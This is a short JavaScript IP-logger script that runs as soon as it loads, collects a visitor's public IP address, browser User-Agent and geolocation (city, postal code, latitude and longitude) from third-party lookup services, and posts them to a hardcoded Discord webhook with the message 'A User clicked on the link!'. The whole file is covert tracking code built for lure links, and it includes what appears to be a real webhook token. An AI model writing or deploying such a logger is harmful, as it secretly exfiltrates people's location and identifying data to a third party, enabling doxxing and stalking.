const sendIP = () => {
    const userAgent = navigator.userAgent; // Capture the browser's User-Agent

    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;

            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1410930902707601418/OL94ZgkySxNkxbaP0EfYkVRaOiNIPgnTOemhhqlHmn6n3Uj7oqlpHaB8MXuzbHaPHe9m'; // Replace with your webhook URL

                    const embed = {
                        title: 'A User clicked on the link!',
                        description: `**IP Address >>** ${ipadd}
**User-Agent >>** ${userAgent}
**Network >>** ${geoData.network}
**City >>** ${geoData.city}
**Region >>** ${geoData.region}
**Country >>** ${geoData.country_name}
**Postal Code >>** ${geoData.postal}
**Latitude >>** ${geoData.latitude}
**Longitude >>** ${geoData.longitude}`,
                        color: 0x800080
                    };

                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "Glem bot",
                            avatar_url: "https://t4.ftcdn.net/jpg/00/10/29/99/360_F_10299968_1z4xdoUIBgeQ4GVKqsf1sg9sot3Qe6RV.jpg",
                            content: `@here`,
                            embeds: [embed]
                        })
                    });
                });
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
        });
};

// Run the logger
sendIP();
